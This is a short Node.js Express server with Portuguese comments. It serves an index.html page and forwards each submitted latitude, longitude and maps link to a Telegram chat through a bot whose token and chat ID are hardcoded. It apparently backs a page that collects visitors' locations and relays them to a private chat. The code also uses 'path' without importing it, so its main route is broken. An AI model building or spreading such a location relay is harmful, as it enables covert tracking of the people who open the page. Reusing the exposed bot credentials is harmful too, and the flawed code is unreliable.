const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");

const app = express();
app.use(cors());
app.use(express.json());

// Servir arquivos estáticos da pasta atual
app.use(express.static(__dirname));

// Definir rota principal para servir o index.html
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"), (err) => {
    if (err) {
      console.error("Erro ao servir index.html:", err);
      res.status(500).send("Erro interno no servidor");
    }
  });
});

// Defina os valores diretamente no código
const TELEGRAM_BOT_TOKEN = "8145134129:AAGbRgrOOnc0_3_eCVawdvNBqHrDbY_EMhc";
const TELEGRAM_CHAT_ID = "-4725079122";

// Função para enviar mensagem para o Telegram
async function sendTelegramMessage(text) {
  try {
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error(
      "❌ Erro ao enviar mensagem para o Telegram:",
      error.response ? error.response.data : error.message
    );
  }
}

// Enviar mensagem ao Telegram quando o servidor iniciar
async function notifyServerOnline() {
  const message = "🚀 Servidor está online e pronto para receber requisições!";
  await sendTelegramMessage(message);
}

// Endpoint para receber localização e enviar ao Telegram
app.post("/api/send-location", async (req, res) => {
  console.log("📩 Recebendo requisição para /api/send-location");
  if (!req.body || !req.body.latitude || !req.body.longitude) {
    return res
      .status(400)
      .json({ success: false, message: "Dados incompletos" });
  }

  const { latitude, longitude, maps } = req.body;
  const message = `📍 Localização:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;

  try {
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown" }
    );

    res.status(200).json({ success: true, message: "Localização enviada!" });
  } catch (error) {
    res
      .status(500)
      .json({ success: false, message: "Erro ao enviar para o Telegram" });
  }
});

// Rodar na porta 8088 ou na definida pela Vercel
const port = process.env.PORT || 8088;
app.listen(port, async () => {
  console.log(`Servidor rodando na porta ${port}`);
  await notifyServerOnline();
});

// Exporta a API como um handler para a Vercel
module.exports = app;
